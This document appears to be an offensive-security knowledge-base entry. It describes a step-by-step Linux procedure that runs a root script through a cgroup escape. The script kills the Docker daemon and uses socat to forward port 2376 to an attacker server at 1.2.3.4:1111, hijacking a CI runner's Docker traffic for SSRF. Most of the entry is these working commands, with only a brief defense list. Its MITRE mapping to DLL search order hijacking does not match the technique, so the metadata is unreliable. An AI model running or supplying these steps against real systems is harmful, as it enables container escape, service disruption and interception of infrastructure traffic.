---
tags:
  - daemon-kill
  - traffic-forward
  - socat
type: procedure
tools:
  - '[[tools/socat]]'
tactics:
  - '[[Defense Evasion]]'
  - '[[Lateral Movement]]'
commands:
  - '[[commands/create-cmd-script-shebang]]'
  - '[[commands/append-kill-and-socat-to-cmd-script]]'
  - '[[commands/chmod-executable-cmd]]'
  - '[[commands/trigger-cgroup-execution]]'
  - '[[commands/cat-kill-socat-output]]'
platforms:
  - Linux
techniques:
  - '[[Service Stop]]'
  - '[[DLL Search Order Hijacking]]'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 1de68314-da29-4a01-af8a-e03f0cf1d1a3
created_at: '2025-12-14T04:08:48.101Z'
updated_at: '2025-12-14T04:08:48.101Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Defense Evasion]]'
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Service Stop]]'
  - '[[DLL Search Order Hijacking]]'
---
# Kill Docker Daemon and Redirect Traffic with Socat

## Summary

This procedure uses cgroup to run a root script that kills the Docker daemon and starts socat to forward incoming connections on port 2376 to the external malicious server, hijacking all Runner Docker communications.

## Description

After identifying the PID, terminate dockerd to free the port, then use socat for TCP proxying. This redirects the Runner's Docker client requests to the attacker's server, where SSRF redirects occur. Errors are logged to host file for verification.

## Requirements

1. Cgroup and $host_path setup
2. Known dockerd PID (e.g., 999)
3. Socat installed on host
4. Malicious server running on 1.2.3.4:1111

## Defense

Defensive measures and detection strategies:

- Bind dockerd to localhost only (no TCP)
- Use firewalls to block port 2376 forwards
- Monitor process kills and unexpected socat instances
- Implement daemon health checks with auto-restart

## Objectives

1. Terminate legitimate dockerd
2. Proxy traffic to malicious endpoint
3. Enable SSRF via hijacked API

## Instructions

### Step 1: Initialize Script (Reuse)

**Context**: Overwrite /cmd for new actions.

**Command** ([[commands/create-cmd-script-shebang]]):
```bash
echo '#!/bin/sh' > /cmd
```

> Resets script.

### Step 2: Append Kill and Forward Commands

**Context**: Kill PID and start socat proxy.

**Command** ([[commands/append-kill-and-socat-to-cmd-script]]):
```bash
echo "sudo kill -9 999 && socat tcp-listen:2376,reuseaddr,fork tcp:1.2.3.4:1111 2> $host_path/k2" >> /cmd
```

> Kills process 999, then socat listens on 2376 forwarding to attacker; errors to /k2. Replace 999 and IP.

### Step 3: Make Executable (Reuse)

**Context**: Ensure runnability.

**Command** ([[commands/chmod-executable-cmd]]):
```bash
chmod a+x /cmd
```

> Sets permissions.

### Step 4: Trigger Execution

**Context**: Run as root via cgroup.

**Command** ([[commands/trigger-cgroup-execution]]):
```bash
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

> Executes the script.

### Step 5: Check Errors

**Context**: Verify socat status.

**Command** ([[commands/cat-kill-socat-output]]):
```bash
cat /k2
```

> Should show no bind errors if port freed.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion]]
- [[Lateral Movement]]

### Techniques

- [[Service Stop]]
- [[DLL Search Order Hijacking]]

### Sub-Techniques


## Commands Used

- [[commands/create-cmd-script-shebang]]
- [[commands/append-kill-and-socat-to-cmd-script]]
- [[commands/chmod-executable-cmd]]
- [[commands/trigger-cgroup-execution]]
- [[commands/cat-kill-socat-output]]

## Tools Used

- [[tools/socat]]

## Tags

- daemon-kill
- traffic-forward
- socat
